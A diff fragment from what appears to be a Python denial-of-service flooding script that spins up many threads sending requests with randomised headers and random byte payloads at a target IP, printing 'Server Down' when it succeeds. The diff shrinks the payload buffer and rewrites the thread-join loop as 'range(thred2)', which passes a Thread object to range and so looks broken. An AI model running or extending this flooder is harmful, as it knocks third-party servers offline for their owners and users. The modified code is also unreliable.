@@ -295,7 +295,7 @@ def start3():
             print('[+] Server Down.')
 def start2():
     global useragents, ref, acceptall, lolagent
-    hh = random._urandom(75006)
+    hh = random._urandom(7560)
     xx = int(0)
     lolaccept ="LolAccept: "+random.choice(lolagent)+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+str(ip)+"\r\n"
     useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
@@ -346,5 +346,5 @@ for x in range(thread):
     thred2 = threading.Thread(target=start2)
     thred2.start()
     thred.start()
-for ty in range(150):
+for ty in range(thred2):
   thred2.join()
